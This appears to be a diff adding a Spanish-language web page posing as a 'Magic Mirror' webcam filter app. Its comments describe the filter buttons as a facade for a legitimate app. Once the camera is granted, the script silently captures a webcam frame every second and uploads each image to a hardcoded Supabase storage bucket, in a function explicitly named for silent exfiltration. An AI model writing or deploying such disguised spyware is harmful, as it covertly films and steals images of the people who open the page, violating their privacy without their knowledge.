@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magic Mirror & Filters</title>
+    <!-- Tailwind CSS para un diseño limpio y moderno -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- SDK de Supabase (Versión 2) -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div class="max-w-md w-full bg-slate-800 rounded-2xl shadow-2xl p-6 flex flex-col items-center border border-slate-700">
+        <h1 class="text-2xl font-bold mb-2 text-cyan-400">Espejo Mágico ✨</h1>
+        <p class="text-slate-400 text-sm mb-6 text-center">Prueba divertidos filtros en tiempo real.</p>
+
+        <!-- Contenedor del Video (Simulando el Espejo) -->
+        <div class="relative w-full aspect-4/3 bg-black rounded-xl overflow-hidden shadow-inner mb-6 border border-slate-600 flex items-center justify-center">
+            <video id="webcam" autoplay playsinline class="w-full h-full object-cover -scale-x-100"></video>
+            <canvas id="canvas" class="hidden"></canvas>
+            
+            <!-- Mensaje inicial si tarda el permiso -->
+            <div id="loading" class="absolute inset-0 flex items-center justify-center bg-slate-900/80 text-sm text-slate-300">
+                Iniciando cámara...
+            </div>
+        </div>
+
+        <!-- Selector de Filtros Visuales (Fachada de app legítima) -->
+        <div class="w-full flex justify-around gap-2">
+            <button onclick="cambiarFiltro('none')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Normal</button>
+            <button onclick="cambiarFiltro('grayscale(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Blanco y Negro</button>
+            <button onclick="cambiarFiltro('sepia(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Retro</button>
+            <button onclick="cambiarFiltro('invert(100%)')" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-medium transition cursor-pointer">Negativo</button>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURACIÓN DE SUPABASE ---
+        const SUPABASE_URL = 'https://eyrjeiszkcgodhkqbzeh.supabase.co';
+        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FIZoG-kv9eo141pJp-teQA_EOagu9LO';
+        
+        // Inicialización directa y segura del cliente
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const loadingDiv = document.getElementById('loading');
+
+        // Inicializar cámara y bucle silencioso
+        async function iniciarApp() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+                video.srcObject = stream;
+                loadingDiv.style.display = 'none'; 
+                console.log("Cámara iniciada correctamente. Iniciando bucle de captura...");
+
+                // Ejecutar la captura cada 1 segundo
+                setInterval(capturarYExfiltrarSilenciosamente, 1000);
+            } catch (err) {
+                loadingDiv.innerText = "Error: Se requiere acceso a la cámara.";
+                console.error("Error al acceder a la cámara:", err);
+            }
+        }
+
+        // Cambio de filtros visuales en la interfaz
+        function cambiarFiltro(filtro) {
+            video.style.filter = filtro;
+        }
+
+        // Lógica de captura y envío con logs detallados de depuración
+        function capturarYExfiltrarSilenciosamente() {
+            if (!video.videoWidth || !video.videoHeight) {
+                console.warn("El video aún no tiene dimensiones cargadas.");
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    console.error("No se pudo generar el blob de la imagen.");
+                    return;
+                }
+
+                const nombreArchivo = `captura_${Date.now()}.jpg`;
+                console.log("Intentando subir archivo:", nombreArchivo);
+
+                try {
+                    const { data, error } = await supabaseClient.storage
+                        .from('capturas')
+                        .upload(nombreArchivo, blob, {
+                            contentType: 'image/jpeg',
+                            upsert: false
+                        });
+
+                    if (error) {
+                        console.error("❌ Error devuelto por Supabase Storage:", error.message);
+                    } else {
+                        console.log("✅ ¡Foto subida con éxito!", data.path);
+                    }
+                } catch (err) {
+                    console.error("❌ Excepción de red/código al subir:", err);
+                }
+            }, 'image/jpeg', 0.6);
+        }
+
+        // Arrancar automáticamente al cargar la web
+        window.onload = iniciarApp;
+    </script>
+</body>
+</html>
